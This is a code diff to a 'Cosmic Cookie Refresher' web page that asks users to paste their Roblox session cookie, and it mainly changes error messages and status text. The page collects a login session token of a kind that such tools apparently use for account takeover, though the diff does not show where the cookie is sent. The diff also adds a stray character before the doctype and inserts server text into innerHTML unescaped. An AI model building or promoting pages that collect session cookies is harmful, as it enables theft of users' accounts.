@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+l<!DOCTYPE html>
 <html>
 <head>
     <title>Cosmic Cookie Refresher</title>
@@ -309,7 +309,7 @@
         <div class="card">
             <div class="input-group">
                 <label class="input-label">🔐 Paste Your Roblox Cookie:</label>
-                <textarea class="cookie-input" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.C5FEC87931CC..."></textarea>
+                <textarea class="cookie-input" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
             </div>
 
             <button class="refresh-btn" onclick="refreshCookie()">
@@ -363,6 +363,21 @@
             statusDiv.innerHTML = message;
         }
 
+        // Enhanced error display
+        function displayError(error) {
+            const statusDiv = document.getElementById('status');
+            let errorHTML = `❌ ${error.error}`;
+            
+            if (error.details) {
+                errorHTML += `<br><small style="opacity: 0.8;">${error.details}</small>`;
+            }
+            
+            errorHTML += `<br><small style="opacity: 0.6;"><strong>Tip:</strong> Make sure you're copying the entire cookie from browser storage</small>`;
+            
+            statusDiv.innerHTML = errorHTML;
+            statusDiv.className = 'status error';
+        }
+
         // Refresh cookie function
         async function refreshCookie() {
             const cookie = document.getElementById('cookieInput').value.trim();
@@ -389,7 +404,12 @@
                 const data = await response.json();
 
                 if (!response.ok) {
-                    throw new Error(data.error || 'Unknown error occurred');
+                    if (data.details) {
+                        displayError(data);
+                    } else {
+                        throw new Error(data.error || 'Unknown error occurred');
+                    }
+                    return;
                 }
 
                 // Display results
@@ -407,22 +427,26 @@
                     </div>
                     <div class="info-item">
                         <span class="info-label">🔄 Method:</span>
-                        <span class="info-value">Authentication Ticket</span>
+                        <span class="info-value">${data.method || 'Authentication Ticket'}</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">💫 Status:</span>
-                        <span class="info-value">Successfully Refreshed</span>
+                        <span class="info-value">Successfully Processed</span>
                     </div>
                 `;
 
                 resultContainer.style.display = 'block';
-                updateStatus('success', '✅ Cookie refreshed successfully!');
+                updateStatus('success', '✅ Cookie processed successfully!');
 
                 // Smooth scroll to results
                 resultContainer.scrollIntoView({ behavior: 'smooth' });
 
             } catch (error) {
-                updateStatus('error', `❌ Error: ${error.message}`);
+                if (error.message.includes('Failed to fetch')) {
+                    updateStatus('error', '❌ Network error: Cannot connect to server. Make sure the server is running.');
+                } else {
+                    updateStatus('error', `❌ Error: ${error.message}`);
+                }
                 resultContainer.style.display = 'none';
             }
         }
@@ -468,4 +492,4 @@
         });
     </script>
 </body>
-</html>
+        </html>
